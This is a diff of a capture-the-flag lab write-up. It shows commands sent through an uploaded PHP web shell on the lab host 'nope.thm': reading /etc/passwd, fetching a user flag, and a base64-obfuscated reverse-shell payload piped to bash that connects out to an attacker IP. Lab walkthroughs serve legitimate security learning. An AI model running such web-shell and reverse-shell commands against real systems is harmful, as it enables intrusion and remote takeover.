@@ -67,7 +67,7 @@ then I tried to give it an argument via `cmd` parameter and it worked as well!
 
 ![cmd](https://user-images.githubusercontent.com/71389295/185770219-ee2fc1c4-2483-4e07-b284-5786d403e536.png)
 
-next thing I did was getting the list of users on the system `http://nope.thm/cvs/shell.pdf.php?cmd=cat+/etc/passwd`, getting the user flag from `/home/lachlan/user.txt` (`http://nope.thm/cvs/shell.pdf.php?cmd=cat+/home/lachlan/user.txt`) then getting a reverse shell with [`http://nope.thm/cvs/shell.pdf.php?cmd=echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuOC4xNDQuMTQ5LzEwMDAwIDA8JjEgMj4mMQo=|base64+-d|bash`](http://nope.thm/cvs/shell.pdf.php?cmd=echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuOC4xNDQuMTQ5LzEwMDAwIDA8JjEgMj4mMQo=%7Cbase64+-d%7Cbash)
+next thing I did was getting the list of users on the system `http://nope.thm/cvs/shell.pdf.php?cmd=cat+/etc/passwd`, getting the user flag from `/home/lachlan/user.txt` (`http://nope.thm/cvs/shell.pdf.php?cmd=cat+/home/lachlan/user.txt`) then getting a reverse shell with `http://nope.thm/cvs/shell.pdf.php?cmd=echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuOC4xNDQuMTQ5LzEwMDAwIDA8JjEgMj4mMQo=|base64+-d|bash`)
 
 ![reverse_connection](https://user-images.githubusercontent.com/71389295/185770226-f3cf592a-8542-4138-807f-cace491d3418.png)
 
